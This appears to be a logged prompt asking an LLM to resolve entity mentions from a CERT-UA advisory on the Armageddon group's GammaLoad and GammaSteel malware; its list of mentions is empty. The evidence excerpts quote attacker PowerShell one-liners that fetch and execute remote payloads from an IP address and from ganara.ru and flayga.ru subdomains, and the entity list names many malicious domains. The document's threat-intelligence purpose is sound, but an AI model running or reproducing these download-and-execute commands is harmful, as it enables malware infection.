=== REQUEST (gemini gemini-3.7-flash) ===
--- sampling ---
{"temperature":0}
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1]
E2. stage1.ps1
E3. z.ps1
E4. GammaLoad.PS1_v2
E5. stage2.ps1
E6. TRYxaEbX_2.ps1
E7. TRYxaEbX [aka TRYxaEbX.ps1]
E8. OpenSSL
E9. OUTSTEEL
E10. GraphSteel
E11. Internet Explorer
E12. .NET Framework
E13. Ngrok
E14. ConfuserEx
E15. MarsStealer
E16. FTPGetter
E17. JesterStealer
E18. Safari
E19. Hashcat
E20. dnsmasq
E21. needrestart
E22. Meterpreter
E23. HTM dropper
E24. PowerShell [aka powershell.exe]
E25. 223329.exe
E26. POWERGAP
E27. Icloud.exe [aka Iclouding.exe]
E28. b.exe
E29. 62ea.exe
E30. MS PowerPoint
E31. MSDriverLoader.exe [aka MSDriverMonitor.exe]
E32. wscript.exe
E33. GammaSteel.NET
E34. HarvesterX
E35. PowerShell (powershell.exe)
E36. GammaSteel.PS1
E37. kopratiso.ru
E38. acteran.ru [aka tortunas.ru]
E39. bilitora.ru
E40. fishitor.ru
E41. apoxipodes.ru
E42. dodortar.ru
E43. tiloraso.ru
E44. a0322810.xsph.ru
E45. billyhot.ru
E46. dod-upload.dodortar.ru
E47. candidar.ru
E48. lnk-upload.dodortar.ru
E49. arentuk.com
E50. motocheck.in
E51. stormpredictor.host
E52. nitikora.ru
E53. meteolink.host
E54. xsph.ru
E55. successilin.top
E56. moskeet.com
E57. erwini.ru
E58. mulleti.ru
E59. bul-opros.top
E60. iol.pt
E61. toknowall.com
E62. gopoppers.com
E63. podologaneri.it
E64. co-opros.top
E65. districoperav.icu
E66. potrakit.ru
E67. giraffe-tour.ru
E68. rivierafamily.com
E69. mx-out-14.default-host.net
E70. tridiuma.ru
E71. yandex.ru
E72. varanasiclick.ru
E73. olei.ro
E74. jevejosader.top
E75. enlamentedeunasesor.com
E76. milotrad.ru
E77. milotraf.ru
E78. s8.h.mchost.ru
E79. lingrevelat.com
E80. aspe.ro
E81. omyce.ru
E82. pastebin.com
E83. leonardis.ru
E84. jokotras.ru
E85. blopik.com
E86. afi-opros.top
E87. nikotod.ru
E88. mitraseo.hol.es
E89. parodadoca.ru
E90. marmaris.com.ua
E91. nx0.ru
E92. ncscc.gov.ua
E93. rmssrv4.ru
E94. rmssrv2.ru
E95. www.msftncsi.com
E96. tas-gos.top
E97. staystrongjewels.com
E98. wi-opros.top
E99. xcasinobonuses.net
E100. viewdns.net
E101. servebeer.com
E102. evil.server.com
E103. 3utilities.com
E104. gotdns.ch
E105. agreminj.com
E106. whoer.net
E107. airmauritiusticket.com
E108. cloudflare-dns.com
E109. sytes.net
E110. bounceme.net
E111. ddns.net
E112. plexbd.net
E113. brunoboys.net
E114. ns.ns2-dns.com [aka ns2-dns.com]
E115. dcshost.net
E116. netbin.host
E117. d-upl.ddns.net
E118. gov-ua.info
E119. president.gov.ua.administration.vakansiyi.administration.president.gov-ua.info
E120. ns.ns3-dns.com [aka ns3-dns.com]
E121. dyndns.com
E122. freedynamicdns.org
E123. www.facebook.com
E124. winchconstruction.com
E125. www.michiganmastereltiempo.com
E126. www.symantec.com
E127. kohhd.com
E128. fluoxi.com
E129. atlantar.ru
E130. motoristo.ru
E131. moolin.ru
E132. bubenci.ru
E133. callsol.ru
E134. clipperso.ru
E135. cooperi.ru
E136. detroito.ru
E137. farafauler.ru
E138. flayga.ru
E139. ganara.ru
E140. hawksi.ru
E141. hofsteder.ru
E142. kilitro.ru
E143. kurapat.ru
E144. lnasfe.ru
E145. lopasts.ru
E146. mafirti.ru
E147. metanat.ru
E148. mitlubald.ru
E149. paparat.ru
E150. pasamart.ru
E151. qkcew.ru
E152. rncsq.ru
E153. tarlit.ru
E154. tbwelo.ru
E155. wicksl.ru
E156. xcqef.ru
E157. nxkad.ru
E158. dnslookup.seowebchecker.com
E159. tools.nexcess.net
E160. viewdns.info
E161. www.portcheckers.com
E162. lover.printing82.detroito.ru
Mentions:
